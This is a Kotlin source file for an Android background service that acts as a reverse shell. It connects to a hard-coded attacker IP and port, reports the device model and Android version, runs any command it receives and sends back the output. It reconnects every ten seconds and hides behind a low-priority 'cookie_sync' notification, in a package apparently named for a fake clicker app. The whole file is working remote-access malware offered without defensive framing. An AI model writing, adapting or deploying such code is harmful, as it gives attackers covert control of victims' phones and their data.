package tech.fakeclicker

import android.app.*
import android.content.Intent
import android.os.Build
import android.os.IBinder
import java.io.*
import java.net.Socket

class ReverseShellService : Service() {

    private val C2_IP   = "192.168.1.100"  // change to attacker laptop IP before build
    private val C2_PORT = 4444

    private val CHANNEL_ID = "cookie_sync"
    private var shellThread: Thread? = null

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        startForeground(1, buildNotification())
        shellThread = Thread(::connectLoop, "shell-loop").also { it.start() }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int =
        START_STICKY

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        shellThread?.interrupt()
        super.onDestroy()
    }

    private fun connectLoop() {
        while (!Thread.currentThread().isInterrupted) {
            try {
                Socket(C2_IP, C2_PORT).use { socket ->
                    socket.soTimeout = 0
                    val reader = BufferedReader(InputStreamReader(socket.getInputStream()))
                    val writer = PrintWriter(BufferedWriter(OutputStreamWriter(socket.getOutputStream())), true)

                    writer.println("[*] ${Build.MANUFACTURER} ${Build.MODEL} | Android ${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})")
                    writer.println("[*] shell ready")

                    var line: String?
                    while (reader.readLine().also { line = it } != null) {
                        val cmd = line!!.trim()
                        if (cmd == "exit") return
                        val output = ShellExecutor.run(cmd)
                        writer.println(output)
                        writer.println("---")
                    }
                }
            } catch (_: Exception) {}

            try { Thread.sleep(10_000) } catch (_: InterruptedException) { break }
        }
    }

    private fun buildNotification(): Notification {
        val pendingIntent = PendingIntent.getActivity(
            this, 0,
            Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_IMMUTABLE
        )
        return Notification.Builder(this, CHANNEL_ID)
            .setContentTitle(getString(R.string.notification_title))
            .setContentText(getString(R.string.notification_text))
            .setSmallIcon(android.R.drawable.ic_popup_sync)
            .setContentIntent(pendingIntent)
            .build()
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= 26) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                getString(R.string.notification_channel_name),
                NotificationManager.IMPORTANCE_MIN
            ).apply { setShowBadge(false) }
            getSystemService(NotificationManager::class.java)
                .createNotificationChannel(channel)
        }
    }
}
